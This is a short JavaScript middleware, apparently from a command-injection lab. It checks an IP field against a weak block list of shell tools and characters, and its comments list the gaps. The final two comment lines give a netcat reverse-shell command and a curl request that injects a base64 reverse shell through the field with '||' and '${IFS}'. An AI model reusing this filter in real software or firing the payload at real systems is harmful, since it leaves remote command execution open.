const validateIpAddress = (req, res, next) => {
    const ipAddress = req.body.ipAddress;
  
    const unwantedCharacters = /[;'"&<>*()%^!`\\\[\]\/\s\t\n]/; // Misses |, $, {, }
    const blacklistedFunctions = [ 
      'nc', 'ncat', 'awk', 'python','ruby', 'socat', 'mkfifo', 'telnet', 'curl', 'lua', 
      'wget', 'rm', 'mv', 'ls',
      'cat', 'dd', 'kill', 'ln', 'chmod', 'chown',
      'chroot', 'cp', 'dd', 'df', 'du', 'ed',
      'env', 'kill', 'killall', 'ln', 'ls', 'lsof',
      'mkdir', 'mkfs', 'mknod', 'more', 'mv', 'nano',
      'nice', 'nohup', 'ping', 'ps', 'reboot', 'rm',
      'rmdir', 'shutdown', 'su', 'sudo', 'touch',
      'umount', 'uname', 'unzip', 'vi', 'vim', 'vipw',
      'wall', 'whereis', 'which', 'whoami'
    ]; // Misses bash, sh, ...
  
    const containsUnwantedCharacters = unwantedCharacters.test(ipAddress);
    const containsBlacklistedFunction = blacklistedFunctions.some(func => ipAddress.includes(func));

    if (containsUnwantedCharacters || containsBlacklistedFunction) {
      return res.status(400).json({ error: 'Stop hacking me ;(' });
    }
  
    next();
  };
  
export default validateIpAddress;

// nc 192.168.10.35 12345 -e sh
// curl -X POST -H "Content-Type: application/json" -d '{"ipAddress": "I.dont.Exist||echo${IFS}<base64_reverse_shell>|base64${IFS}-d|bash"}' http://192.168.1.130:5000/ping